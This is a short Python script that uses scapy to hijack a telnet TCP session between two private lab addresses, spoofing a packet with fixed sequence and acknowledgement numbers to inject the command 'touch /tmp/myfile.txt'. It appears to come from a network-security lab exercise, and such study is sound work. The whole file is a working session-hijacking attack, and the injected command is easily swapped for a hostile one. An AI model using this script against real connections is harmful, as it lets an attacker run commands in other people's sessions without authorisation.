#!/usr/bin/python3
from scapy.all import *

print("SENDING SESSION HIJACKING PACKET.........")

ip  = IP(src="10.0.2.6", dst="10.0.2.7")
tcp = TCP(sport=59896, dport=23, flags="A", seq=1036464067, ack=900641567)
data = "\n touch /tmp/myfile.txt\n"
pkt = ip/tcp/data
send(pkt, verbose=0)

